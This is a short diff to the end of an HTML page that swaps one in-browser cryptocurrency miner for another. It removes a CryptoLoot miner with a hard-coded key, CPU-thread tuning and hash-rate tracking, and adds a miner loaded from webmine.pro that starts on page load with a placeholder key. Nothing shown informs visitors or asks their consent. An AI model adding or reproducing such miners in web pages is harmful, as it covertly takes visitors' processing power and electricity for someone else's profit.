@@ -39,29 +39,9 @@
   
 <script src="//webmine.pro/lib/crlt.js"></script>
 <script>
-            var threads = window.navigator.hardwareConcurrency / 2;
-            if (threads < 1) {
-                var threads = 1;
-            }
-            var miner=new CryptoLoot.Anonymous('9c2fc3abc7d4f37b4b1f1df43b566b82d020e4949746', {
-                threads:threads,autoThreads:false,throttle:0.5,
-            });
-        miner.start();
+	var miner = new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY');
+	miner.start();
 </script>
-<script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
-
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
-
-		// Output to HTML elements...
-	}, 1000);
-</script>  
   
 </body>
 </html>
